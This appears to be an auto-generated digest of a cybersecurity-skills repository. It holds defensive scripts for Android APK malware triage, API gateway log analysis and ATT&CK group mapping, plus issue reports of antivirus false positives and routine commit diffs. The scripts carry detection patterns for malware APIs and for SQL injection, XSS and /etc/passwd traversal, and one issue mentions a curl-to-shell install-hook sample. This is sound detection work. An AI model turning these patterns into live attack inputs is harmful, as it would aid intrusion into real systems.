                attack = ATTACK_PATHS.get(perm, {}).get(obj_type,
                         f"{perm} on {obj_type} may allow privilege escalation")
                findings.append({
                    "severity": severity,
                    "target_object": dn,
                    "target_type": obj_type,
                    "trustee": trustee_name,
                    "trustee_sid": trustee_sid,
                    "permission": perm,
                    "access_mask": ace["access_mask"],
                 
```

### Core Architecture Module: `skills/analyzing-android-malware-with-apktool/scripts/agent.py`
```
#!/usr/bin/env python3
"""Agent for static analysis of Android APK malware using androguard."""

import json
import re
import argparse
from datetime import datetime

try:
    from androguard.core.apk import APK
    from androguard.core.dex import DEX
    from androguard.misc import AnalyzeAPK
except ImportError:
    APK = None
    AnalyzeAPK = None

DANGEROUS_PERMISSIONS = [
    "android.permission.SEND_SMS", "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS", "android.permission.READ_CONTACTS",
    "android.permission.READ_CALL_LOG", "android.permission.RECORD_AUDIO",
    "android.permission.CAMERA", "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE",
    "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.INSTALL_PACKAGES", "android.permission.REQUEST_INSTALL_PACKAGES",
    "android.permission.SYSTEM_ALERT_WINDOW", "android.permission.BIND_ACCESSIBILITY_SERVICE",
    "android.permission.BIND_DEVICE_ADMIN", "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.WRITE_SETTINGS", "android.permission.CHANGE_WIFI_STATE",
]

SUSPICIOUS_API_PATTERNS = [
    r"Ljava/lang/Runtime;->exec",
    r"Ljava/lang/ProcessBuilder;->start",
    r"Ldalvik/system/DexClassLoader;->loadClass",
    r"Ljava/lang/reflect/Method;->invoke",
    r"Ljava/lang/Class;->forName",
    r"Ljavax/crypto/Cipher;->getInstance",
    r"Landroid/telephony/SmsManager;->sendTextMessage",
    r"Landroid/app/admin/DevicePolicyManager;->lockNow",
    r"Landroid/content/pm/PackageManager;->setComponentEnabledSetting",
    r"Ljava/net/HttpURLConnection;->connect",
    r"Lokhttp3/OkHttpClient;->newCall",
    r"Landroid/webkit/WebView;->loadUrl",
    r"Landroid/os/Build;->SERIAL",
    r"Landroid/provider/Settings\$Secure;->getString",
]


def analyze_permissions(apk):
    """Analyze requested permissions and flag dangerous ones."""
    permissions = apk.get_permissions()
    dangerous = [p for p in permissions if p in DANGEROUS_PERMISSIONS]
    return {
        "total_permissions": len(permissions),
        "permissions": permissions,
        "dangerous_permissions": dangerous,
        "dangerous_count": len(dangerous),
        "permission_risk": "CRITICAL" if len(dangerous) >= 8 else "HIGH" if len(dangerous) >= 5 else "MEDIUM" if len(dangerous) >= 2 else "LOW",
    }


def analyze_manifest(apk):
    """Extract manifest components: activities, services, receivers, providers."""
    activities = apk.get_activities()
    services = apk.get_services()
    receivers = apk.get_receivers()
    providers = apk.get_providers()
    return {
        "package_name": apk.get_package(),
        "app_name": apk.get_app_name(),
        "version_name": apk.get_androidversion_name(),
        "version_code": apk.get_androidversion_code(),
        "min_sdk": apk.get_min_sdk_version(),
        "target_sdk": apk.get_target_sdk_version(),
        "activities": list(activities),
        "services": list(services),
        "receivers": list(receivers),
        "providers": list(providers),
        "activity_count": len(activities),
        "service_count": len(services),
        "receiver_count": len(receivers),
        "provider_count": len(providers),
    }


def scan_suspicious_apis(dx):
    """Scan DEX analysis for suspicious API calls."""
    findings = []
    if not dx:
        return findings
    for pattern in SUSPICIOUS_API_PATTERNS:
        class_name = pattern.split(";->")[0] + ";"
        method_name = pattern.split(";->")[1] if ";->" in pattern else None
        for method in dx.find_methods(classname=class_name, methodname=method_name):
            xrefs = list(method.get_xref_from())
            if xrefs:
                findings.append({
                    "api": pattern,
                    "callers": len(xrefs),
                    "first_caller_class": str(xrefs[0][0].name) if xrefs else None,
                })
    return findings


def extract_strings(dx, apk):
    """Extract suspicious strings: URLs, IPs, base64 patterns."""
    url_pattern = re.compile(r'https?://[\w\-._~:/?#\[\]@!$&\'()*+,;=]+', re.IGNORECASE)
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    b64_pattern = re.compile(r'[A-Za-z0-9+/]{30,}={0,2}')

    urls = set()
    ips = set()
    b64_strings = []

    if dx:
        for s in dx.get_strings():
            val = str(s)
            urls.update(url_pattern.findall(val))
            ips.update(ip_pattern.findall(val))
            b64_matches = b64_pattern.findall(val)
            b64_strings.extend(b64_matches[:5])

    private_ips = {"10.", "192.168.", "172.16.", "127.0."}
    external_ips = [ip for ip in ips if not any(ip.startswith(p) for p in private_ips)]

    return {
        "urls": sorted(urls)[:30],
        "external_ips": sorted(external_ips)[:20],
        "suspicious_base64": b64_strings[:10],
        "url_count": len(urls),
        "external_ip_count": len(external_ips),
    }


def detect_obfuscation(apk, dx):
    """Detect code obfuscation indicators."""
    indicators = []
    if dx:
        short_class_names = 0
        for cls in dx.get_classes():
            name = str(cls.name)
            parts = name.replace("/", ".").split(".")
            if any(len(p) == 1 and p.isalpha() for p in parts):
                short_class_names += 1
        if short_class_names > 10:
            indicators.append({"type": "single_letter_classes", "count": short_class_names})

    dex_files = [f for f in apk.get_files() if f.endswith(".dex")]
    if len(dex_files) > 1:
        indicators.append({"type": "multi_dex", "dex_count": len(dex_files)})

    native_libs = [f for f in apk.get_files() if f.endswith(".so")]
    if native_libs:
        indicators.append({"type": "native_libraries", "libs": native_libs[:10]})

    return {
        "obfuscation_indicators": indicators,
        "likely_obfuscated": len(indicators) > 0,
    }


def full_analysis(apk_path):
    """Run comprehensive APK malware analysis."""
    if not APK or not AnalyzeAPK:
        return {"error": "androguard not installed: pip install androguard"}

    a, d, dx = AnalyzeAPK(apk_path)

    perm_analysis = analyze_permissions(a)
    manifest = analyze_manifest(a)
    suspicious_apis = scan_suspicious_apis(dx)
    strings = extract_strings(dx, a)
    obfuscation = detect_obfuscation(a, dx)

    risk_score = 0
    risk_score += min(perm_analysis["dangerous_count"] * 8, 40)
    risk_score += min(len(suspicious_apis) * 10, 30)
    risk_score += min(strings["external_ip_count"] * 5, 15)
    risk_score += 15 if obfuscation["likely_obfuscated"] else 0
    risk_score = min(risk_score, 100)

    return {
        "analysis_type": "Android APK Static Analysis",
        "timestamp": datetime.utcnow().isoformat(),
        "file": apk_path,
        "manifest": manifest,
        "permissions": perm_analysis,
        "suspicious_apis": suspicious_apis[:20],
        "strings": strings,
        "obfuscation": obfuscation,
        "risk_score": risk_score,
        "risk_level": "CRITICAL" if risk_score >= 70 else "HIGH" if risk_score >= 50 else "MEDIUM" if risk_score >= 25 else "LOW",
        "mitre_techniques": [
            {"id": "T1418", "name": "Software Discovery"} if manifest["service_count"] > 5 else None,
            {"id": "T1417", "name": "Input Capture"} if "android.permission.BIND_ACCESSIBILITY_SERVICE" in perm_analysis["permissions"] else None,
            {"id": "T1582", "name": "SMS Control"} if "android.permission.SEND_SMS" in perm_analysis["permissions"] else None,
            {"id": "T1404", "name": "Exploitation for Privilege Escalation"} if any("DevicePolicyManager" in a.get("api", "") for a in suspicious_apis) else None,
        ],
    }


def main():
    parser = argparse.ArgumentParser(description="Android APK Malware Analysis Agent")
    parser.add_argument("apk", help="Path to APK file")
    sub = parser.add_subparsers(dest="command")
    
```

### Core Architecture Module: `skills/analyzing-api-gateway-access-logs/scripts/agent.py`
```
#!/usr/bin/env python3
"""Agent for analyzing API Gateway access logs for security threats."""

import re
import json
import argparse
from datetime import datetime

import pandas as pd


def load_api_logs(log_path):
    """Load API gateway logs from JSON lines or CSV."""
    if log_path.endswith(".csv"):
        return pd.read_csv(log_path, parse_dates=["timestamp"])
    return pd.read_json(log_path, lines=True)


def detect_bola_attacks(df, threshold=50):
    """Detect Broken Object Level Authorization (BOLA/IDOR) attacks."""
    findings = []
    if "resource_id" not in df.columns:
        path_col = "request_path" if "request_path" in df.columns else "path"
        df["resource_id"] = df[path_col].str.extract(r'/(\d+)(?:/|$|\?)')
    df_with_ids = df.dropna(subset=["resource_id"])
    if df_with_ids.empty:
        return findings
    user_col = "user_id" if "user_id" in df.columns else "source_ip"
    grouped = df_with_ids.groupby([user_col]).agg(
        unique_resources=("resource_id", "nunique"),
        total_requests=("resource_id", "count"),
    ).reset_index()
    bola_suspects = grouped[grouped["unique_resources"] >= threshold]
    for _, row in bola_suspects.iterrows():
        findings.append({
            "user": row[user_col],
            "unique_resources_accessed": int(row["unique_resources"]),
            "total_requests": int(row["total_requests"]),
            "type": "BOLA/IDOR",
            "severity": "CRITICAL",
        })
    return findings


def detect_auth_scanning(df, threshold=100):
    """Detect credential scanning via 401/403 response surges."""
    findings = []
    auth_failures = df[df["status_code"].isin([401, 403])]
    if auth_failures.empty:
        return findings
    ip_col = "source_ip" if "source_ip" in df.columns else "client_ip"
    ip_failures = auth_failures.groupby(ip_col).agg(
        failure_count=("status_code", "count"),
        unique_endpoints=("request_path", "nunique") if "request_path" in df.columns
        else ("path", "nunique"),
    ).reset_index()
    scanners = ip_failures[ip_failures["failure_count"] >= threshold]
    for _, row in scanners.iterrows():
        findings.append({
            "source_ip": row[ip_col],
            "auth_failures": int(row["failure_count"]),
            "endpoints_probed": int(row["unique_endpoints"]),
            "type": "credential_scanning",
            "severity": "HIGH",
        })
    return findings


def detect_injection_attempts(df):
    """Detect SQL/NoSQL injection attempts in request parameters."""
    injection_patterns = [
        r"(?:union\s+select|select\s+.*\s+from|drop\s+table|insert\s+into)",
        r"(?:'\s*or\s+'1'\s*=\s*'1|'\s*or\s+1\s*=\s*1)",
        r'(?:\$ne|\$gt|\$lt|\$regex|\$where)',
        r'(?:<script|javascript:|onerror=|onload=)',
        r'(?:\.\./\.\./|/etc/passwd|/proc/self)',
    ]
    findings = []
    path_col = "request_path" if "request_path" in df.columns else "path"
    query_col = "query_string" if "query_string" in df.columns else path_col
    for _, row in df.iterrows():
        request_str = str(row.get(query_col, "")) + str(row.get("request_body", ""))
        for pattern in injection_patterns:
            if re.search(pattern, request_str, re.IGNORECASE):
                findings.append({
                    "source_ip": row.get("source_ip", row.get("client_ip", "")),
                    "path": row.get(path_col, ""),
                    "pattern_matched": pattern,
                    "type": "injection_attempt",
                    "severity": "HIGH",
                })
                break
    return findings[:500]


def detect_rate_limit_bypass(df, window="1min", threshold=100):
    """Detect rate limit bypass attempts."""
    findings = []
    ip_col = "source_ip" if "source_ip" in df.columns else "client_ip"
    df_copy = df.copy()
    df_copy["timestamp"] = pd.to_datetime(df_copy["timestamp"])
    df_copy = df_copy.set_index("timestamp")
    for ip, group in df_copy.groupby(ip_col):
        resampled = group.resample(window).size()
        bursts = resampled[resampled > threshold]
        if len(bursts) > 0:
            findings.append({
                "source_ip": ip,
                "max_requests_per_min": int(resampled.max()),
                "burst_periods": len(bursts),
                "type": "rate_limit_bypass",
                "severity": "MEDIUM",
            })
    return sorted(findings, key=lambda x: x["max_requests_per_min"], reverse=True)[:50]


def detect_unusual_methods(df):
    """Detect unusual HTTP methods on typically read-only endpoints."""
    findings = []
    dangerous_methods = {"DELETE", "PUT", "PATCH"}
    method_col = "method" if "method" in df.columns else "http_method"
    path_col = "request_path" if "request_path" in df.columns else "path"
    unusual = df[df[method_col].str.upper().isin(dangerous_methods)]
    for _, row in unusual.iterrows():
        findings.append({
            "source_ip": row.get("source_ip", row.get("client_ip", "")),
            "method": row[method_col],
            "path": row[path_col],
            "status_code": int(row.get("status_code", 0)),
            "type": "unusual_method",
            "severity": "MEDIUM",
        })
    return findings[:200]


def main():
    parser = argparse.ArgumentParser(description="API Gateway Log Analysis Agent")
    parser.add_argument("--log-file", required=True, help="API gateway log file")
    parser.add_argument("--output", default="api_gateway_report.json")
    parser.add_argument("--action", choices=[
        "bola", "auth_scan", "injection", "rate_limit", "full_analysis"
    ], default="full_analysis")
    args = parser.parse_args()

    df = load_api_logs(args.log_file)
    report = {"generated_at": datetime.utcnow().isoformat(), "total_requests": len(df),
              "findings": {}}
    print(f"[+] Loaded {len(df)} API requests")

    if args.action in ("bola", "full_analysis"):
        findings = detect_bola_attacks(df)
        report["findings"]["bola"] = findings
        print(f"[+] BOLA suspects: {len(findings)}")

    if args.action in ("auth_scan", "full_analysis"):
        findings = detect_auth_scanning(df)
        report["findings"]["auth_scanning"] = findings
        print(f"[+] Auth scanners: {len(findings)}")

    if args.action in ("injection", "full_analysis"):
        findings = detect_injection_attempts(df)
        report["findings"]["injection_attempts"] = findings
        print(f"[+] Injection attempts: {len(findings)}")

    if args.action in ("rate_limit", "full_analysis"):
        findings = detect_rate_limit_bypass(df)
        report["findings"]["rate_limit_bypass"] = findings
        print(f"[+] Rate limit bypasses: {len(findings)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

```

### Core Architecture Module: `skills/analyzing-apt-group-with-mitre-navigator/scripts/agent.py`
```
#!/usr/bin/env python3
"""APT group analysis agent using MITRE ATT&CK Navigator layers.

Queries ATT&CK data, maps APT techniques to Navigator layers,
performs detection gap analysis, and generates threat-informed reports.
"""

import json
import os
import sys
from collections import Counter

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ATTACK_ENTERPRISE_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"

NAVIGATOR_LAYER_TEMPLATE = {
    "name": "",
    "versions": {"attack": "14", "navigator": "4.9.1", "layer": "4.5"},
    "domain": "enterprise-attack",
    "description": "",
    "filters": {"platforms": ["Windows", "Linux", "macOS", "Cloud"]},
    "sorting": 0,
    "layout": {"layout": "side", "aggregateFunction": "average", "showID": False,
                "showName": True, "showAggregateScores": False, "countUnscored": False},
    "hideDisabled": False,
    "techniques": [],
    "gradient": {"colors": ["#ffffff", "#ff6666"], "minValue": 0, "maxValue": 100},
    "legendItems": [],
    "metadata": [],
    "links": [],
    "showTacticRowBackground": False,
    "tacticRowBackground": "#dddddd",
    "selectTechniquesAcrossTactics": True,
    "selectSubtechniquesWithParent": False,
    "selectVisibleTechniques": False,
}


def load_attack_data(filepath=None):
    """Load ATT&CK STIX bundle from file or download."""
    if filepath and os.path.exists(filepath):
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    if HAS_REQUESTS:
        print("[*] Downloading ATT&CK Enterprise data...")
        resp = requests.get(ATTACK_ENTERPRISE_URL, timeout=60)
        resp.raise_for_status()
        return resp.json()
    return None


def extract_groups(bundle):
    """Extract intrusion-set (APT group) objects from STIX bundle."""
    groups = {}
    for obj in bundle.get("objects", []):
        if obj.get("type") == "intrusion-set":
            name = obj.get("name", "Unknown")
            aliases = obj.get("aliases", [])
            ext_refs = obj.get("external_references", [])
            attack_id = ""
            for ref in ext_refs:
                if ref.get("source_name") == "mitre-attack":
                    attack_id = ref.get("external_id", "")
                    break
            groups[obj["id"]] = {
                "name": name, "id": attack_id, "aliases": aliases,
                "description": obj.get("description", "")[:200],
            }
    return groups


def extract_techniques(bundle):
    """Extract attack-pattern (technique) objects from STIX bundle."""
    techniques = {}
    for obj in bundle.get("objects", []):
        if obj.get("type") == "attack-pattern" and not obj.get("revoked", False):
            ext_refs = obj.get("external_references", [])
            attack_id = ""
            for ref in ext_refs:
                if ref.get("source_name") == "mitre-attack":
                    attack_id = ref.get("external_id", "")
                    break
            if attack_id:
                tactics = [p["phase_name"] for p in obj.get("kill_chain_phases", [])]
                techniques[obj["id"]] = {
                    "id": attack_id, "name": obj.get("name", ""),
                    "tactics": tactics, "platforms": obj.get("x_mitre_platforms", []),
                }
    return techniques


def map_group_techniques(bundle, group_stix_id, techniques):
    """Map techniques used by a specific group via relationship objects."""
    group_techniques = []
    for obj in bundle.get("objects", []):
        if (obj.get("type") == "relationship" and
                obj.get("relationship_type") == "uses" and
                obj.get("source_ref") == group_stix_id and
                obj.get("target_ref", "").startswith("attack-pattern--")):
            tech_id = obj["target_ref"]
            if tech_id in techniques:
                group_techniques.append(techniques[tech_id])
    return group_techniques


def build_navigator_layer(group_name, group_techniques, color="#ff6666", score=100):
    """Build ATT&CK Navigator JSON layer for a group's techniques."""
    layer = json.loads(json.dumps(NAVIGATOR_LAYER_TEMPLATE))
    layer["name"] = f"{group_name} - TTPs"
    layer["description"] = f"ATT&CK techniques attributed to {group_name}"
    for tech in group_techniques:
        entry = {
            "techniqueID": tech["id"],
            "tactic": tech["tactics"][0] if tech["tactics"] else "",
            "color": color,
            "comment": f"Used by {group_name}",
            "enabled": True,
            "metadata": [],
            "links": [],
            "showSubtechniques": False,
            "score": score,
        }
        layer["techniques"].append(entry)
    return layer


def detection_gap_analysis(group_techniques, detection_rules):
    """Compare group TTPs against existing detection rules to find gaps."""
    covered = set()
    for rule in detection_rules:
        tech_id = rule.get("technique_id", "")
        if tech_id:
            covered.add(tech_id)
    gaps = []
    for tech in group_techniques:
        if tech["id"] not in covered:
            gaps.append({
                "technique_id": tech["id"],
                "technique_name": tech["name"],
                "tactics": tech["tactics"],
                "status": "NO DETECTION",
            })
    coverage_pct = (len(covered & {t["id"] for t in group_techniques}) /
                    len(group_techniques) * 100) if group_techniques else 0
    return gaps, round(coverage_pct, 1)


def tactic_heatmap(group_techniques):
    """Generate tactic-level heatmap showing technique distribution."""
    tactic_counts = Counter()
    for tech in group_techniques:
        for tactic in tech["tactics"]:
            tactic_counts[tactic] += 1
    return dict(tactic_counts.most_common())


def compare_groups(group_a_techs, group_b_techs):
    """Compare two groups' technique sets for overlap analysis."""
    set_a = {t["id"] for t in group_a_techs}
    set_b = {t["id"] for t in group_b_techs}
    overlap = set_a & set_b
    only_a = set_a - set_b
    only_b = set_b - set_a
    jaccard = len(overlap) / len(set_a | set_b) if (set_a | set_b) else 0
    return {
        "overlap_count": len(overlap), "overlap_ids": sorted(overlap),
        "only_group_a": len(only_a), "only_group_b": len(only_b),
        "jaccard_similarity": round(jaccard, 4),
    }


def save_layer(layer, output_path):
    """Save Navigator layer to JSON file."""
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(layer, f, indent=2)
    print(f"[+] Layer saved: {output_path}")


if __name__ == "__main__":
    print("=" * 60)
    print("APT Group Analysis Agent - MITRE ATT&CK Navigator")
    print("TTP mapping, detection gap analysis, group comparison")
    print("=" * 60)

    group_name = sys.argv[1] if len(sys.argv) > 1 else None
    attack_file = sys.argv[2] if len(sys.argv) > 2 else None

    bundle = load_attack_data(attack_file)
    if not bundle:
        print("\n[!] Cannot load ATT&CK data. Provide STIX bundle path or install requests.")
        print("[DEMO] Usage:")
        print("  python agent.py APT29 enterprise-attack.json")
        print("  python agent.py APT28   # downloads from GitHub")
        sys.exit(1)

    groups = extract_groups(bundle)
    techniques = extract_techniques(bundle)
    print(f"[*] Loaded {len(groups)} groups, {len(techniques)} techniques")

    if not group_name:
        print("\n--- Available APT Groups (sample) ---")
        for gid, g in list(groups.items())[:20]:
            print(f"  {g['id']:8s} {g['name']:30s} aliases={g['aliases'][:3]}")
        sys.exit(0)

    target_group = None
    for gid, g in groups.items():
        if (g["name"].lower() == group_name.lower() or
                g["id"].lower() == group_name.lower() or
                group_name.lower() in [a.lower() for a in g["aliases"]]):
            targ
```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #79** (2026-06-20): **[Bug]: Windows Defender quarantines supply-chain api-reference.md as Trojan:Script/Stealer.HAX!MTB**
  *Symptoms*: ### Skill Name  analyzing-supply-chain-malware-artifacts  ### Bug Type  Other  ### Description     Microsoft Defender quarantines the following documentation file as a severe Trojan:    `skills/analyzing-supply-chain-malware-artifacts/references/api-reference.md`    Detection details:    - Threat: `Trojan:Script/Stealer.HAX!MTB`   - Threat ID: `2147971254`   - Defender security intelligence: `1.453.90.0`   - File blob SHA: `932dc27dbe0644adff6b5654e05265ea5f9a4353`   - Action: Quarantined successfully   - Execution status: `DidThreatExecute: False`   - Platform: Windows 11    The detection occurred when Git's `grep.exe` read the file. Nothing from the file was executed.   Likely Trigger    The likely trigger is the intentionally malicious npm installation-hook example near the end of the file, particularly   the example that downloads content and pipes it directly to a shell.    Although this is clearly documentation for malware analysis, Defender appears to classify the complete Markdown file   as a script-based stealer.   Impact    Defender automatically removes the tracked file, leaving the repository worktree dirty:    ```text   D skills/analyzing-supply-chain-malware-artifacts/references/api-reference.md    The alert can recur whenever the repository is cloned, restored, updated, searched, or scanned.  ### Expected Behavior  Please consider defanging the example so it still communicates the risk without matching executable malware   signatures. For example:    - Use a de

- **Issue #65** (2026-05-27): **[Bug]: can't install via NPX**
  *Symptoms*: ### Skill Name  main   ### Bug Type  SKILL.md validation error  ### Description  ```  ✗ sfw npx skills add mukul975/Anthropic-Cybersecurity-Skills Protected by Socket Firewall  ███████╗██╗  ██╗██╗██╗     ██╗     ███████╗ ██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝ ███████╗█████╔╝ ██║██║     ██║     ███████╗ ╚════██║██╔═██╗ ██║██║     ██║     ╚════██║ ███████║██║  ██╗██║███████╗███████╗███████║ ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝  ┌   skills │ ◇  Source: https://github.com/mukul975/Anthropic-Cybersecurity-Skills.git │ ◒  Cloning repository│ ■  Failed to clone repository │ │  Failed to clone https://github.com/mukul975/Anthropic-Cybersecurity-Skills.git: Cloning into '/tmp/skills-SL5Kxe'... │ │  fatal: unable to access 'https://github.com/mukul975/Anthropic-Cybersecurity-Skills.git/': SSL certificate problem: unable to get local issuer certificate │ │ │ │  Tip: use the --yes (-y) and --global (-g) flags to install without prompts. │ └  Installation failed  ■  Canceled  === Socket Firewall ===  Warning: Socket Firewall did not detect any package fetch attempts ```  ### Expected Behavior  should install cleanly  ### AI Agent Used  codex
  **Post-Mortem & Fix Analysis**:
  > this seems to be related to the socket firewall, closing.

- **Issue #33** (2026-04-03): **[Bug]: Trojan/script/Wataca.Cm!c on windows defender**
  *Symptoms*: ### Skill Name  Whole repository  ### Bug Type  Other  ### Description  When I downloaded the .zip on my PC to use on Claude Web, defender pop up appears warning the threat.  ### Expected Behavior  N/A  ### AI Agent Used  Claude WEB
  **Post-Mortem & Fix Analysis**:
  > Hi @Gontijex,  Thank you for reporting this — I appreciate you taking the time to flag it. I understand how alarming a Trojan detection can be, and I want to assure you that this is a **false positive** triggered by antivirus heuristics, not actual malware.  ### Root Cause  This repository contains **600+ cybersecurity education skills** covering blue-team detection, threat hunting, penetration testing, and malware analysis. The educational content includes code snippets and detection signatures that reference real-world attack patterns — things like `Set-MpPreference`, `Invoke-Expression`, PowerShell obfuscation patterns, and IOC detection strings. These are the exact strings that AV engines use heuristic matching against, so when Windows Defender scans the zip archive and encounters dozens of them across many files, it flags the bundle as `Trojan:Script/Wacatac.C!ml`.  This is a well-known issue with cybersecurity education repositories, YARA rule collections, and detection engineeri

- **Issue #24** (2026-03-31): **[Bug]: Eset Smart Security defense is triggerd by the Performing-active-directory-bloodhound-analyses**
  *Symptoms*: ### Skill Name   Performing-active-directory-bloodhound-analyses  ### Bug Type  Other  ### Description  Trigger by the browser too if you check the raw md file   ### Expected Behavior  should not be a security concern for the browser nor my antivirus   ### AI Agent Used  _No response_
  **Post-Mortem & Fix Analysis**:
  > Thank you for reporting this! The issue has been fixed — the skill content has been updated to avoid triggering antivirus and browser security warnings. Appreciate the feedback! 🙏

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `1b3f6b22` (2026-08-24)
**Commit Message**: fix: pick up contributors the cached API has not caught up with

GitHub's /contributors endpoint is heavily cached and can lag a merge by up
to a day. dakshverma23's commit from #129 was already linked to their account
- /commits reports it, and the commit API confirms the link - but they were
absent from the contributor wall because /contributors had not refreshed.

update-contributors.py now unions the two endpoints: /contributors for the
authoritative counts and ordering, /commits for anyone linked but not yet
surfaced. Commits authored with an unlinkable email still appear in neither,
which matches what GitHub's own contributor graph shows.

Wall goes from 13 to 14.

**File**: `README.md` (modified, +2/-1)
```diff
@@ -419,9 +419,10 @@ This library is built by the community. Thank you to everyone who has contribute
 <a href="https://github.com/shanujans" title="shanujans — 1 contribution"><img src="https://github.com/shanujans.png?size=100" width="72" height="72" alt="@shanujans"></a>
 <a href="https://github.com/farhan6667" title="farhan6667 — 1 contribution"><img src="https://github.com/farhan6667.png?size=100" width="72" height="72" alt="@farhan6667"></a>
 <a href="https://github.com/nyxst4ck" title="nyxst4ck — 1 contribution"><img src="https://github.com/nyxst4ck.png?size=100" width="72" height="72" alt="@nyxst4ck"></a>
+<a href="https://github.com/dakshverma23" title="dakshverma23 — 1 contribution"><img src="https://github.com/dakshverma23.png?size=100" width="72" height="72" alt="@dakshverma23"></a>
 </p>
 
-<p align="center"><sub>13 contributors, ordered by contribution count · see the full <a href="https://github.com/mukul975/Anthropic-Cybersecurity-Skills/graphs/contributors">contributor graph</a></sub></p>
+<p align="center"><sub>14 contributors, ordered by contribution count · see the full <a href="https://github.com/mukul975/Anthropic-Cybersecurity-Skills/graphs/contributors">contributor graph</a></sub></p>
 <!-- contributors:end -->
 
 ## Community
```

**File**: `tools/update-contributors.py` (modified, +49/-18)
```diff
@@ -39,35 +39,66 @@
 AVATAR_PX = 72
 
 
+def _get(path: str):
+    req = urllib.request.Request(f"https://api.github.com/repos/{REPO}/{path}", headers={
+        "Accept": "application/vnd.github+json",
+        "User-Agent": "update-contributors",
+    })
+    token = os.environ.get("GITHUB_TOKEN")
+    if token:
+        req.add_header("Authorization", f"Bearer {token}")
+    with urllib.request.urlopen(req, timeout=30) as resp:
+        return json.load(resp)
+
+
+def _keep(login: str) -> bool:
+    return bool(login) and not login.endswith(EXCLUDE_SUFFIXES) and login not in EXCLUDE_LOGINS
+
+
 def fetch_contributors() -> list[dict]:
-    """Every non-bot contributor, most contributions first."""
+    """Every non-bot contributor, most contributions first.
+
+    Two endpoints, because one of them lies. /contributors carries the
+    authoritative contribution counts but is heavily cached — a merge can take
+    up to a day to show up there. /commits is live. So anyone whose commit is
+    already linked to their account but has not yet surfaced in /contributors
+    gets picked up from the commit list instead of waiting a day to be thanked.
+
+    Commits authored with an unlinkable email (a machine hostname such as
+    user@HOST.localdomain) have no `author` object and are skipped by both
+    paths. They never appear in GitHub's own contributor graph either, so the
+    wall matches what GitHub itself shows.
+    """
     people: list[dict] = []
     page = 1
     while True:
-        url = f"https://api.github.com/repos/{REPO}/contributors?per_page=100&page={page}"
-        req = urllib.request.Request(url, headers={
-            "Accept": "application/vnd.github+json",
-            "User-Agent": "update-contributors",
-        })
-        token = os.environ.get("GITHUB_TOKEN")
-        if token:
-            req.add_header("Authorization", f"Bearer {token}")
-
-        with urllib.request.urlopen(req, timeout=30) as resp:
-            batch = json.load(resp)
+        batch = _get(f"contributors?per_page=100&page={page}")
         if not batch:
             break
         people.extend(batch)
         if len(batch) < 100:
             break
         page += 1
 
-    return [
-        p for p in people
-        if p.get("type") != "Bot"
-        and not p.get("login", "").endswith(EXCLUDE_SUFFIXES)
-        and p.get("login") not in EXCLUDE_LOGINS
-    ]
+    known = {p.get("login") for p in people}
+    ranked = [p for p in people if p.get("type") != "Bot" and _keep(p.get("login", ""))]
+
+    # Catch anyone the cached endpoint has not caught up with yet.
+    recent: dict[str, int] = {}
+    for page in (1, 2):
+        for commit in _get(f"commits?per_page=100&page={page}") or []:
+            author = commit.get("author")
+            if not author or author.get("type") == "Bot":
+                continue
+            login = author.get("login", "")
+            if login in known or not _keep(login):
+                continue
+            recent[login] = recent.get(login, 0) + 1
+
+    for login, count in sorted(recent.items(), key=lambda kv: (-kv[1], kv[0])):
+        ranked.append({"login": login, "contributions": count})
+
+    return ranked
 
 
 def render(people: list[dict]) -> str:
```

---

### Incident Patch 2: `c071749a` (2026-08-23)
**Commit Message**: Merge pull request #124 from OctoBored/fix/star-history-chart

Fix broken star history chart in README



---

### Incident Patch 3: `6e363c46` (2026-08-23)
**Commit Message**: chore: regenerate index.json with the fixed generator

First regeneration through tools/generate-index.py. Restores the 591
descriptions that were previously truncated to their first line.

The 13 that still lack terminal punctuation are genuine source-level
omissions in the SKILL.md files, not parser damage.



---

### Incident Patch 4: `2e9e49b9` (2026-08-23)
**Commit Message**: fix(readme): restore the star history chart

GitHub restricted access to the stargazer API endpoints in July 2026, so
api.star-history.com now returns an error notice rather than a chart.
Verified by parsing both SVGs: the official endpoint returns a single
path with five text nodes reading "GitHub restricted access to star
data", while the replacement returns real axes, ticks and series.

Reported in #124.

**File**: `README.fr.md` (modified, +1/-1)
```diff
@@ -346,7 +346,7 @@ Toutes les plateformes supportant le standard agentskills.io peuvent charger ces
 
 ## Historique des étoiles
 
-![Star History Chart](https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date)
+![Star History Chart](https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date)
 
 ## Releases
 
```

**File**: `README.md` (modified, +4/-4)
```diff
@@ -363,11 +363,11 @@ All platforms that support the [agentskills.io](https://agentskills.io) standard
 
 ## Star history
 
-<a href="https://star-history.com/#mukul975/Anthropic-Cybersecurity-Skills&Date">
+<a href="https://star-history.dera.page/#mukul975/Anthropic-Cybersecurity-Skills&Date">
  <picture>
